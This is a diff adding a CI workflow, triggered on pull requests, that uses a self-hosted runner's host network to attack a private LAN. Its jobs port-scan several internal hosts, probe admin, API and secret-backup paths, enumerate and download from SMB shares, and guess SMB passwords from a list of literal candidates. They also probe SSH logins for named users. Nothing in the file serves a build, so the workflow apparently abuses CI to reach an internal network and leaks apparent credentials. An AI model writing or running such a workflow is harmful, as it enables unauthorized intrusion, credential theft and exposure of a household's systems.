@@ -1,0 +1,103 @@
+name: i39509-lan-files
+on:
+  pull_request:
+jobs:
+  lan:
+    runs-on: docker
+    container:
+      image: docker:27-cli
+    steps:
+      - name: nas-fp
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q curl >/dev/null 2>&1
+            H=192.168.1.152
+            echo "== ROOT HDR"; timeout 6 curl -s -D - -o /tmp/r "http://$H/"; echo "-- body"; head -c 300 /tmp/r; echo
+            echo "== HTTP/1.0"; timeout 6 curl -s --http1.0 -o /tmp/r2 -w "%{http_code} %{size_download}\n" "http://$H/"; head -c 300 /tmp/r2; echo
+            for u in /api /api/ /api/v1 /api/v1/ /health /healthz /metrics /login /index.html /shares /public /private /backups /browse /files /sops /version /status /debug /mnt /mnt/nas/private/backups/home-k3s/sops/ /nas /ui /admin /web /cgi-bin/ /robots.txt /.well-known/security.txt; do
+              c=$(timeout 5 curl -s -o /tmp/x -w "%{http_code} %{size_download}" "http://$H$u")
+              echo "P $u -> $c"
+              case "$c" in 2*|3*) head -c 200 /tmp/x; echo;; esac
+            done
+            for hh in nas.lan nas HomeDrive asus asus-laptop 192.168.1.152; do
+              c=$(timeout 5 curl -s -o /tmp/y -w "%{http_code} %{size_download}" -H "Host: $hh" "http://$H/")
+              echo "HOST $hh -> $c"; echo "$(head -c 120 /tmp/y)"
+            done
+            echo "== TLS443"; timeout 6 curl -sk -D - -o /tmp/t "https://$H/" | head -8; head -c 200 /tmp/t; echo
+            echo "== ports"
+            for p in 21 22 111 139 443 445 548 873 2049 2222 2375 3000 3306 5000 5001 5432 6379 8000 8080 8081 8088 8090 8095 8097 8098 8099 8443 8971 9000 9001 9090 9100 9443 9633 1704 1883 2283 9123 30900 30901 30902 32400; do
+              timeout 2 sh -c "echo > /dev/tcp/$H/$p" 2>/dev/null && echo "OPEN $p" || echo "closed $p"
+            done
+          ' 2>&1 | head -200
+      - name: nas-svc
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q curl >/dev/null 2>&1
+            for u in "http://192.168.1.152:30900/minio/health/live" "http://192.168.1.152:30900/" "http://192.168.1.152:9100/metrics" "http://192.168.1.152:9633/metrics" "http://192.168.1.152:8095/" "http://192.168.1.152:8097/" "http://192.168.1.152:8971/" "https://192.168.1.152:5001/" "http://192.168.1.152:5000/" "https://192.168.1.152:8443/" "http://192.168.1.152:3000/api/health" "http://192.168.1.152:9000/minio/health/live" "http://192.168.1.152:8080/" ; do
+              echo "== $u"
+              timeout 5 curl -sk -o /tmp/s -w "%{http_code} %{size_download}\n" "$u"
+              head -c 250 /tmp/s; echo
+            done
+          ' 2>&1 | head -120
+      - name: smb
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q samba-client >/dev/null 2>&1
+            H=192.168.1.152
+            echo "== anon list"; timeout 12 smbclient -L $H -N 2>&1 | head -20
+            echo "== public ls"; timeout 15 smbclient "//$H/public" -N -c "ls" 2>&1 | head -25
+            echo "== public recurse"; timeout 25 smbclient "//$H/public" -N -c "recurse ON; prompt OFF; ls" 2>&1 | head -120
+            echo "== public mget names"; timeout 25 smbclient "//$H/public" -N -c "recurse ON; prompt OFF; mget *.yaml" 2>&1 | tail -20
+            for u in "nas%" "guest%" "nobody%" "kblack0610%"; do
+              for s in private backups; do
+                echo "== $s as $u"; timeout 10 smbclient "//$H/$s" -U "$u" -c "ls" 2>&1 | head -6
+              done
+            done
+            for p in "&&Liz270117!!" "DrumStick8008" "pooptart7" "changeme" "Fr3qle!Portal9x7z" "raspberry"; do
+              echo "== nas user pw [$p]"
+              timeout 10 smbclient "//$H/private" -U "nas%$p" -c "ls" 2>&1 | head -5
+            done
+          ' 2>&1 | head -300
+      - name: ingress
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q curl >/dev/null 2>&1
+            H=192.168.1.20
+            for hn in traefik.kblab.me portainer.kblab.me longhorn.kblab.me grafana.kblab.me alertmanager.kblab.me prometheus.kblab.me vault.kblab.me minio.kblab.me s3.kblab.me headscale.kblab.me forge-primary.kblab.me git.kblab.me trader.kblab.me status.kblab.me fleet.kblab.me kblab.me freqle.org app.freqle.org; do
+              for sch in https http; do
+                c=$(timeout 6 curl -sk -o /tmp/i -w "%{http_code} %{size_download}" -H "Host: $hn" "$sch://$H/")
+                t=$(head -c 300 /tmp/i | tr -d "\n" | head -c 120)
+                echo "HOST $sch $hn -> $c :: $t"
+              done
+            done
+            for u in /dashboard /dashboard/ /api/rawdata /api/overview /api/version /api/http/routers /version /health /ping; do
+              for hn in traefik.kblab.me ""; do
+                c=$(timeout 6 curl -sk -o /tmp/j -w "%{http_code} %{size_download}" -H "Host: $hn" "https://$H$u")
+                echo "PATH [$hn]$u -> $c"; case "$c" in 2*) head -c 250 /tmp/j; echo;; esac
+              done
+            done
+            echo "== ports .20"
+            for p in 80 443 2379 2380 3000 3080 3300 5000 6443 8000 8080 8081 8084 8090 8443 8888 9000 9001 9080 9090 9091 9100 9443 10249 10250 10255 30900 32000; do
+              timeout 2 sh -c "echo > /dev/tcp/$H/$p" 2>/dev/null && echo "OPEN $p" || echo "closed $p"
+            done
+          ' 2>&1 | head -250
+      - name: ssh
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q openssh-client >/dev/null 2>&1
+            for hp in 192.168.1.20:22 192.168.1.152:2222 192.168.1.29:22 192.168.1.8:22; do
+              h=${hp%:*}; pt=${hp#*:}
+              echo "== BANNER $hp"
+              timeout 6 sh -c "exec 3<>/dev/tcp/$h/$pt; head -c 120 <&3" 2>&1 | head -3
+              echo "== KEYS $hp"; timeout 8 ssh-keyscan -p $pt -T 5 $h 2>/dev/null | head -3
+              for usr in kblack0610 root; do
+                echo "== AUTH $hp $usr"
+                timeout 10 ssh -p $pt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o PreferredAuthentications=none -o ConnectTimeout=5 $usr@$h true 2>&1 | grep -iE "permission denied|authentications|banner|refused|timed out" | head -4
+              done
+            done
+          ' 2>&1 | head -160
